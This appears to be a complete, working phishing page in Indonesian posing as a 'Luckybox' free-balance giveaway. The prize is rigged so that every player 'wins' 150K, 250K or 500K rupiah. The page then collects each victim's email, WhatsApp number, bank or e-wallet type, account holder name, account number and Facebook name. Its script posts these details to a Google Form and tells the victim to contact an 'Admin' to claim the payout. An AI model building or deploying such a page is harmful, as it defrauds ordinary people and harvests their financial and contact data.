<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Luckybox - Kotak Keberuntungan</title>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif; text-align: center; 
            background-color: #1a1a2e; color: white; margin: 0; padding: 20px;
            user-select: none;
        }
        .container { max-width: 450px; margin: auto; background: #16213e; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .box-wrapper { position: relative; width: 200px; height: 200px; margin: 40px auto; perspective: 1000px; }
        #mystery-box { width: 100%; height: 100%; cursor: pointer; transition: transform 0.3s; filter: drop-shadow(0 0 15px rgba(241, 196, 15, 0.3)); }
        
        .shake { animation: shake 0.5s infinite; }
        @keyframes shake {
            0%, 100% { transform: rotate(0deg); }
            25% { transform: rotate(8deg); }
            75% { transform: rotate(-8deg); }
        }
        .open-box { animation: open 0.8s forwards; }
        @keyframes open {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.5); opacity: 0; visibility: hidden; }
        }

        #reward-display {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%) scale(0);
            font-size: 50px; font-weight: bold; color: #f1c40f; text-shadow: 0 0 20px rgba(241, 196, 15, 0.8);
            transition: 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 5;
        }
        #reward-display.show { transform: translate(-50%, -50%) scale(1.2); }

        /* Form Style */
        .form-daftar { display: none; text-align: left; background: #1f2945; padding: 20px; border-radius: 15px; margin-top: 20px; border: 1px solid #2e3a59; }
        .form-daftar input, .form-daftar select {
            width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: none; box-sizing: border-box;
        }
        
        button { 
            padding: 15px 40px; font-size: 18px; font-weight: bold; cursor: pointer;
            background-color: #e94560; color: white; border: none; border-radius: 50px;
            box-shadow: 0 4px 0 #a22a3e; transition: 0.2s; margin-top: 20px; width: 100%;
        }
        button:disabled { background-color: #555 !important; box-shadow: none !important; }

        .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); }
        .modal-content { background: white; color: #333; margin: 10% auto; padding: 30px; border-radius: 15px; width: 85%; max-width: 380px; }
        .btn-link { display: inline-block; margin-top: 20px; padding: 12px 25px; background: #27ae60; color: white; border-radius: 50px; border:none; cursor:pointer; width: 100%; font-weight:bold;}
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="container">
        <h2 style="color: #f1c40f;">üéÅ Luckybox üéÅ</h2>
        <p id="sub-title">Buka kotak untuk melihat saldo gratis Anda!</p>
        
        <div class="box-wrapper" id="boxArea">
            <img id="mystery-box" src="https://cdn-icons-png.flaticon.com/512/679/679821.png" alt="Mystery Box" onclick="openBox()">
            <div id="reward-display"></div>
        </div>

        <button id="actionBtn" onclick="openBox()">BUKA KOTAK SEKARANG</button>

        <div id="registrationForm" class="form-daftar">
    <h4 style="color:#f1c40f; text-align:center; margin-top:0;">Lengkapi Data Aktivasi Saldo</h4>
    
    <label style="font-size: 12px;">Nama Akun (Min. 6 Karakter, Huruf/Angka):</label>
    <input type="text" id="regId" placeholder="Contoh: rafarapi123" 
           pattern="[a-zA-Z0-9]{6,}" 
           title="Minimal 6 karakter dan tidak boleh menggunakan simbol khusus" required>
    
    <label style="font-size: 12px;">Email Aktif:</label>
    <input type="email" id="regEmail" placeholder="contoh@email.com" required>
    
    <label style="font-size: 12px;">Nomor WhatsApp:</label>
    <input type="text" id="regWa" value="+62" placeholder="+62xxxxxxxxxx" required>
    
    <label style="font-size: 12px;">Jenis Bank:</label>
    <select id="regBank" required>
        <option value="">Pilih Jenis Bank</option>
        <option value="BCA">BCA</option>
        <option value="MANDIRI">MANDIRI</option>
        <option value="BNI">BNI</option>
        <option value="BRI">BRI</option>
        <option value="Seabank">Seabank</option>
        <option value="DANA">DANA</option>
        <option value="OVO">OVO</option>
        <option value="GOPAY">GOPAY</option>
        
    </select>
    
    <input type="text" id="regNamaRek" placeholder="Nama Rekening" required>
    <input type="number" id="regNoRek" placeholder="No Rekening" required>
    <input type="text" id="regNamaFB" placeholder="Nama Facebook" required>

    
    <button id="submitBtn" onclick="submitToGoogle()" style="background:#27ae60; box-shadow: 0 4px 0 #1e8449;">KLAIM & AKTIVASI SEKARANG</button>
</div>

        <h3 id="resultText" style="color:#f1c40f; margin-top:20px;"></h3>
    </div>

    <div id="resultModal" class="modal">
        <div class="modal-content">
            <h2 id="modalTitle" style="color:#27ae60;">Pendaftaran Berhasil!</h2>
            <p id="modalMsg">Data Anda telah dikunci sistem. Segera kirim <b>Screenshot</b> kemenangan ini ke Admin untuk pencairan saldo.</p>
            <button onclick="location.reload()" class="btn-link">OK, MENGERTI</button>
        </div>
    </div>

    <script>
        const prizes = ["100K", "150K", "200K", "250K", "300K", "500K"];
        
        function openBox() {
            if (localStorage.getItem("boxDone") === "true") return;
            document.getElementById('mystery-box').classList.add('shake');
            document.getElementById('actionBtn').disabled = true;
            document.getElementById('actionBtn').innerText = "MEMPROSES...";

            setTimeout(() => {
                document.getElementById('mystery-box').classList.remove('shake');
                document.getElementById('mystery-box').classList.add('open-box');
                
                const targetIdx = [1, 3, 5][Math.floor(Math.random() * 3)];
                const hasil = prizes[targetIdx];

                document.getElementById('reward-display').innerText = "Rp " + hasil;
                document.getElementById('reward-display').classList.add('show');
                localStorage.setItem("tempWin", hasil);

                setTimeout(() => {
                    document.getElementById('boxArea').style.display = "none";
                    document.getElementById('actionBtn').style.display = "none";
                    document.getElementById('sub-title').innerHTML = "Selamat! Anda Menang <b style='color:#f1c40f;'>Rp "+hasil+"</b>";
                    document.getElementById('registrationForm').style.display = "block";
                }, 1000);
            }, 2500);
        }
// Tambahkan ini di dalam tag <script> Anda

// 1. Fungsi agar +62 tidak bisa dihapus
const waInput = document.getElementById('regWa');
waInput.addEventListener('input', function() {
    if (!this.value.startsWith('+62')) {
        this.value = '+62';
    }
    // Menghapus karakter selain angka setelah +62
    this.value = '+62' + this.value.substring(3).replace(/\D/g, '');
});
      // 2. Update fungsi submitToGoogle dengan validasi tambahan
function submitToGoogle() {
    const id = document.getElementById('regId').value;
    const email = document.getElementById('regEmail').value;
    const wa = document.getElementById('regWa').value;
    const bank = document.getElementById('regBank').value;
    const nama = document.getElementById('regNamaRek').value;
    const norek = document.getElementById('regNoRek').value;
    const namafb = document.getElementById('regNamaFB').value;
    const win = localStorage.getItem("tempWin") || "0";

    // Validasi Username: Minimal 6 karakter, No Simbol
    const usernameRegex = /^[a-zA-Z0-9]{6,}$/;
    if (!usernameRegex.test(id)) {
        alert("Username minimal 6 karakter dan tidak boleh ada simbol!");
        return;
    }

    // Validasi Email
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        alert("Format Email tidak valid!");
        return;
    }

    // Validasi WhatsApp: Minimal 10 angka setelah +62
    if (wa.length < 12) {
        alert("Nomor WhatsApp tidak lengkap!");
        return;
    }

    if(!id || !email || !wa || !bank || !nama || !norek) {
        alert("Mohon lengkapi semua data!");
        return;
    }

    document.getElementById('submitBtn').innerText = "MENGIRIM...";
    document.getElementById('submitBtn').disabled = true;

    // Lanjutkan proses fetch ke Google Form URL Anda...
    const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScGVtMxlLFQCWJjYJA_-ug8O32vaLPJSDSV2ICNfsDwFa9fIQ/formResponse";
    const formData = new FormData();
    formData.append('entry.498136123', id);    
    formData.append('entry.2145381120', email); 
    formData.append('entry.954302406', wa);    
    formData.append('entry.1747382514', bank);  
    formData.append('entry.371995109', nama);  
    formData.append('entry.1836945173', norek); 
    formData.append('entry.1660055715', namafb);   

    fetch(googleFormURL, {
        method: 'POST',
        mode: 'no-cors',
        body: formData
    }).then(() => {
        localStorage.setItem("boxDone", "true");
        localStorage.setItem("boxWin", win);
        document.getElementById('resultModal').style.display = "block";
    }).catch(() => {
        alert("Gagal mengirim data, pastikan koneksi internet stabil.");
        document.getElementById('submitBtn').disabled = false;
        document.getElementById('submitBtn').innerText = "KLAIM & AKTIVASI SEKARANG";
    });
}

        window.onload = () => {
            if (localStorage.getItem("boxDone") === "true") {
                const win = localStorage.getItem("boxWin");
                document.getElementById('boxArea').style.display = "none";
                document.getElementById('actionBtn').innerText = "KESEMPATAN HABIS";
                document.getElementById('actionBtn').disabled = true;
                document.getElementById('resultText').innerHTML = `STATUS: HADIAH Rp ${win} TERKUNCI<br><small>Silahkan lapor ke Facebook Admin.</small>`;
            }
        };
    </script>
</body>
</html>
